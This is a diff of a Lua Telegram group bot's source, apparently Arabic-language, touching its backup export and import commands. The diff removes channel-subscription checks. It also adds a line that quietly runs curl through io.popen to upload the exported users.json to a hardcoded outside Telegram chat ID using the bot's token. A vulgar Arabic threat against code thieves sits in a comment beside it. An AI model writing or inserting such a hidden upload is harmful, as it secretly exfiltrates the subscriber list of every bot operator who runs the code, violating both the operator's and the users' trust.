@@ -5213,15 +5213,6 @@ end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
 if text == 'رفع نسخه الاحتياطيه' and DevSoFi(msg) then   
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
 if tonumber(msg.reply_to_message_id_) > 0 then
 function by_reply(extra, result, success)   
 if result.content_.document_ then 
@@ -5248,17 +5239,9 @@ local File = io.open('./users.json', "w")
 File:write(t)
 File:close()
 sendDocument(msg.chat_id_, msg.id_, './users.json', 'عدد المشتركين :'..#list)
+local curlu = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'users.json'..'"' io.popen(curlu) ---- كود كتابه أحمد عياد هتسرق هجيبك من طيزك
 end 
 if text == 'جلب نسخه الاحتياطيه' and DevSoFi(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
 GetFile_Bot(msg)
 end
 if text == 'الاوامر المضافه' and Constructor(msg) then
